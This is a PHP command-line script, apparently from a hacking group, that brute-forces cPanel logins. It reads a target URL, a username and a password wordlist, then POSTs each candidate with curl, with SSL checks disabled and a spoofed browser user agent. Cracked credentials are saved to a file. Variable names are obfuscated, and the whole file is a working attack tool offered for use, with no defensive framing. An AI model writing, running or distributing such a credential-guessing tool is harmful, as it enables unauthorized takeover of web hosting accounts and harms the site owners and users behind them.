<?php
/*
  Hi Bro!
  Tau kan bedanya CODER sama RECORDER?
*/
// Coded by zeerx7 # XploitSec-ID

class pausiGans{
    var $agent;
    var $site;
    var $user;
    var $list;

  public function ____________________(){
    echo "\e[36mexample: https://zone-xsec.com:2083/login\n";
    echo "\e[94mUrl: ";
    $this->site = trim(fgets(STDIN));
    echo "\e[34mUsername Cpanel: ";
    $this->user = trim(fgets(STDIN));
    echo "\e[34mList Password: ";
    $this->list = trim(fgets(STDIN));
    if(file_exists($this->list)){
        $XcGF1c2k1Nzk1ZGZlOA_= $this->agent;
        $XcGF1c2ljOGIzMzQ2NA_= $this->site;
        $XcGF1c2k2ZTBjZTI4MQ_= $this->user;
        $XcGF1c2ljOGUIMzQ2NA_ = $this->list;
        if(!preg_match("#http://|https://#",$XcGF1c2ljOGIzMzQ2NA_)){
           $XcGF1c2ljOGIzMzQ2NA_= 'http://'.$XcGF1c2ljOGIzMzQ2NA_;
         }
        $XcGF1c2liNzVjMGU4MQ_ = trim(file_get_contents($XcGF1c2ljOGUIMzQ2NA_));
        $XcGF1c2liNzVjMGU4MQ_ = explode("\n",$XcGF1c2liNzVjMGU4MQ_);
        foreach($XcGF1c2liNzVjMGU4MQ_ as $XcGF1c2liMDYxNWI1Ng_){
           $XcGF1c2k3MjllZTZhZg_ = [
                     "user" => $XcGF1c2k2ZTBjZTI4MQ_,
                     "pass" => $XcGF1c2liMDYxNWI1Ng_
                   ];
           $XcGF1c2kxNGI1ZWI2Ng_ = curl_init();
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_URL, $XcGF1c2ljOGIzMzQ2NA_);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_FOLLOWLOCATION, 1);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_HEADER, 1);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_USERAGENT, $XcGF1c2k1Nzk1ZGZlOA_);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_SSL_VERIFYPEER, 0);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_SSL_VERIFYHOST, 0);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_TIMEOUT, 17);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_POST, 1);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_POSTFIELDS, $XcGF1c2k3MjllZTZhZg_);
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_COOKIEJAR, "session");
           curl_setopt($XcGF1c2kxNGI1ZWI2Ng_, CURLOPT_COOKIEFILE, "session");
           $XcGF1c2kxIPaUsII2Ng_ = curl_exec($XcGF1c2kxNGI1ZWI2Ng_);
           $XcGF1c2kyZjk0YmM4NA_ = curl_getinfo($XcGF1c2kxNGI1ZWI2Ng_, CURLINFO_HTTP_CODE);
           $XcGF1c2k0YzhhZTliMA_ = $XcGF1c2ljOGIzMzQ2NA_.' {'.$XcGF1c2k2ZTBjZTI4MQ_.'|'.$XcGF1c2liMDYxNWI1Ng_.'}';
           if($XcGF1c2kyZjk0YmM4NA_ == 200 and stristr($XcGF1c2kxIPaUsII2Ng_,'"'.$XcGF1c2k3MjllZTZhZg_['user'].'"')){
                echo "\e[92m".$XcGF1c2k0YzhhZTliMA_." Success\n";
                fwrite(fopen('succes.txt','a+'),$XcGF1c2k0YzhhZTliMA_."\n");
           }else{
                echo "\e[91m".$XcGF1c2k0YzhhZTliMA_." Failed\n";
           }
        }

    }else{
     echo "\e[91m[ ".$this->list." ] Not Found\n";
     exit();
    }
   }
}
$XcGF1c2IQQzhhZTliMA_ = "\e[93m
  ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
  ∞\e[92m       Cpanel Brute Force       \e[93m∞
  ∞\e[94m Coded by Zeerx7 # XploitSec-ID \e[93m∞
  ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
";
print $XcGF1c2IQQzhhZTliMA_;
$CodedByZeerx7 = new pausiGans();
$CodedByZeerx7->agent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
$CodedByZeerx7->____________________();
